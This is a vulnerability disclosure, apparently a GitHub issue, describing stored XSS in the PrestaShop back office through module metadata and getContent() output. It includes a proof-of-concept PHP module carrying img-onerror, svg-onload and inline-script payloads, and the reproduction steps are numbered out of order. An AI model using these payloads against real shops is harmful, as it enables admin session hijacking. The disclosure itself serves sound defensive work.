<img width="948" height="155" alt="image" src="https://github.com/user-attachments/assets/7af6813c-e5a8-47ab-a4b3-62210d246a96" /># [Security] Stored XSS in PrestaShop Back Office Module Rendering

## Summary

A Stored Cross-Site Scripting (XSS) vulnerability exists in the PrestaShop back office. The application renders module-controlled content (metadata fields and configuration output) without sufficient output encoding.

An attacker who can upload a custom module can inject arbitrary JavaScript that executes in an authenticated administrator's browser session.

---

## Affected Versions

* PrestaShop <= 9.2.0 (tested on 9.2.0)

---

## Vulnerability Details

### Injection Vectors

| Injection Point | Trigger Location         | Payload Type |
| --------------- | ------------------------ | ------------ |
| displayName     | Modules → Module Manager | Stored XSS   |
| description     | Modules → Module Manager | Stored XSS   |
| author          | Modules → Module Manager | Stored XSS   |
| getContent()    | Module → Configure page  | Stored XSS   |

---

## Impact

* Arbitrary JavaScript execution in admin context
* Session hijacking
* Privilege escalation
* Full back office compromise

---

## Root Cause

Two rendering paths treat module-controlled content as trusted HTML:

### 1. Module Metadata Rendering

The Module Manager renders:

* displayName
* description
* author

These values are defined in the module constructor and passed to templates (Smarty/Twig) **without HTML encoding**.

---

### 2. Module Configuration Rendering

The return value of `getContent()` is directly injected into the admin DOM.

Any HTML/JavaScript returned by this method executes in the administrator's browser.

---

## Proof of Concept

### PoC Module Structure

```
xss_payload_module.zip
└── xss_payload_module/
    ├── xss_payload_module.php
    ├── config.xml
    └── logo.png
```

---

### PoC Source Code

```php
<?php
if (!defined('_PS_VERSION_')) {
    exit;
}

class Xss_Payload_Module extends Module
{
    public function __construct()
    {
        $this->name = 'xss_payload_module';
        $this->tab = 'administration';
        $this->version = '1.0.0';
        $this->author = '<img src=x onerror=alert("neitsploit1707_XSS")>';
        $this->need_instance = 0;
        $this->bootstrap = true;

        parent::__construct();

        $this->displayName = '<svg onload=alert("DISPLAYNAME_XSS") id="xss-display"></svg>';
        $this->description = '<img src=x onerror=alert("DESCRIPTION_XSS")>';

        $this->ps_versions_compliancy = array(
            'min' => '8.0.0',
            'max' => _PS_VERSION_,
        );
    }

    public function getContent()
    {
        return '
        <div style="padding:20px; border:2px solid red; background:#fff3f3;">
            <h2 id="xss-proof">SAFE XSS TEST MODULE</h2>
            <p>If you see this page, module config rendered successfully.</p>

            <script>
                alert("GETCONTENT_XSS");
                document.getElementById("xss-proof").innerText = "XSS TRIGGERED IN getContent()";
                document.body.style.border = "6px solid red";
            </script>
        </div>';
    }
}
```

---

## Steps to Reproduce

1. Package the PoC module as a ZIP file
<img width="948" height="155" alt="image" src="https://github.com/user-attachments/assets/cc317277-c28c-4974-9344-062208da68ba" />
3. Log in to PrestaShop Back Office (admin)
4. Navigate to `Modules → Module Manager`
<img width="1845" height="812" alt="image" src="https://github.com/user-attachments/assets/d33437fb-5074-440d-b190-e5f9894534a4" />
<img width="1849" height="762" alt="image" src="https://github.com/user-attachments/assets/3b101456-4ad2-4200-a39d-dfd3ff98e476" />
<img width="1668" height="539" alt="image" src="https://github.com/user-attachments/assets/442ea87e-dd70-4762-87d9-de68ff467323" />
<img width="1846" height="793" alt="image" src="https://github.com/user-attachments/assets/01d0062e-3928-4e26-9d7b-67e067354eed" />
6. Click **Upload a module** and upload the PoC

### Result:

* XSS triggers immediately in:

  * displayName
  * description
  * author

Alerts observed:

* `DISPLAYNAME_XSS`
* `DESCRIPTION_XSS`
* `neitsploit1707_XSS`

---

5. Click **Configure** on the module

### Result:

* Script from `getContent()` executes
* Alert: `GETCONTENT_XSS`
* Page content modified → "XSS TRIGGERED"

---

## CWE Classification

* CWE-79: Cross-Site Scripting (XSS)

---

## Attack Requirements

* Ability to upload/install a module (admin or supply chain attack)

---

## Discoverer

neitsploit1707

---

## References

* [https://github.com/xuantien177](https://github.com/xuantien177/POC-submit)
